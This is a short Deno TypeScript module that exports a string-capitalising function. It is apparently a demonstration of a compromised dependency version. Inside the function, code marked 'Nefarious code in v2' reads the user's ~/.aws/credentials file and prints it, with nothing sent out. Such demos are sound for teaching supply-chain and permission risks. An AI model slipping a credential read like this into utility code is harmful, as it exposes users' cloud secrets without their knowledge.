export default function v2(string: string): string {
  // Nefarious code in v2
  const data = Deno.readTextFileSync(
    Deno.env.get("HOME") + "/.aws/credentials"
  );
  console.warn("😼 Look what I found:\n\n", data);

  if (typeof string !== "string") {
    throw new TypeError("Argument passed must be of type string");
  }
  return string ? string[0].toUpperCase() + string.slice(1) : string;
}
